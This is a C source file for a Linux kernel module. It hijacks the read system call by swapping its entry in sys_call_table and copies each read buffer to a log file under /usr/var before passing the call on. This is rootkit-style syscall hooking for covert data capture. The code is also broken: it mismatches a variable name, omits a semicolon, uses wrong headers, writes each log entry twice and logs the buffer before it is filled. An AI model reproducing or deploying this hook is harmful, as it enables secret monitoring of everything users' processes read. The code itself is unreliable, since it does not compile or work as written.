#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/module.h>
#include <sys/syscall.h>
#include <linux/file.h>
#include <linux/fs.h>
#include <uaccess.h>
#include <fcntl.h>

extern void *sys_call_table[];
asmlinkage size_t (*og_sys_read)(int filedes, void *buf, size_t bytes);

static void floglog(char *filename, char *data)
{
  struct file *file;
  loff_t post = 0;
  int fd;

  mm_segment_t old_fs = get_fs();
  set_fs(KERNEL_DS);

  fd = sys_open(filename, O_WRONLY|O_CREAT|O_APPEND, 0644);
  if (fd >= 0) {
    sys_write(fd, data, strlen(data));
    file = fget(fd);
    if (file) {
      vfs_write(file, data, strlen(data), &pos);
      fput(file);
    }
    sys_close(fd);
  }
  set_fs(old_fs);
}

asmlinkage size_t flog_read(int filedes, void *buf, size_t bytes)
{
  int fd;
  char *flogf = "/usr/var/flogfile.log"
  printk("it\'s flogging time!\n");
  floglog(flogf, buf);
  return og_sys_read(filedes, buf, bytes);
}

int init_module()
{
  og_sys_read = sys_call_table[__NR_read];
  sys_call_table[__NR_read] = flog_read;
}

void cleanup_module()
{
  printk("done flogging!\n");
  sys_call_table[__NR_read] = og_sys_read;
}
